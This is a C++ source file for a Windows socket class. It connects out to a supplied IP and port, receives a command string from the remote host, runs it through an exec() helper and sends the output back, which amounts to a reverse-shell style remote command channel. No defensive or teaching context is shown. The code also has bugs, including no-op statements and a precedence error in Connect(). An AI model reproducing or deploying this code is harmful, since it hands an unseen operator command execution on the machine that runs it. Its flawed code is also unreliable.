#include"socket.h"
#include<WinSock2.h>
#include<Ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include<vector>

std::string exec(const char* cmd);

Socket::Socket()
{
    addr_info;
    ip, port;
    WSAStartup(MAKEWORD(2, 2), &wsaData); // tracks the errors

    this->sock = socket(AF_INET, SOCK_STREAM, 0);
    if (this->sock == INVALID_SOCKET)
        std::cout << "socket could not have been built " << WSAGetLastError() << std::endl;


}

int Socket::Connect(const char* ip, short port)
{
    this->ip = ip;
    this->port = port;

    this->addr_info.sin_family = AF_INET; // using IPv4
    this->addr_info.sin_port = htons(port); // choosing port
    inet_pton(AF_INET, ip, &addr_info.sin_addr.s_addr);
    int val;
    if (val = connect(sock, (sockaddr*)&addr_info, sizeof(addr_info)) == SOCKET_ERROR)
        std::cout << "error in socket connection " << WSAGetLastError() << std::endl;
    return val;
}

void Socket::Send(std::string in)
{
    std::string part;
    char stc[4096] = { 0 };
    if (in.size() == 0)
    {
        strcpy_s(stc, std::string("no output").c_str());
        send(sock, stc, sizeof stc, 0);
    }
    while (in.size() >= 4096)
    {
        part = in.substr(0, 4095);
        std::cout << part;
        in = in.substr(4095);
        strcpy_s(stc, part.c_str());
        send(sock, stc, sizeof stc, 0);
        memset(stc, 0, part.size());
    }
    strcpy_s(stc, in.c_str());
    std::cout << in.size();
    send(sock, stc, (int)in.size(), 0);
}

int Socket::TelNet()
{
    char cmd[1024] = { 0 };
    recv(sock, cmd, sizeof cmd, 0);

    std::string output = exec(cmd);
    std::cout << output << std::endl;
    Send(output);
    return 0;
}
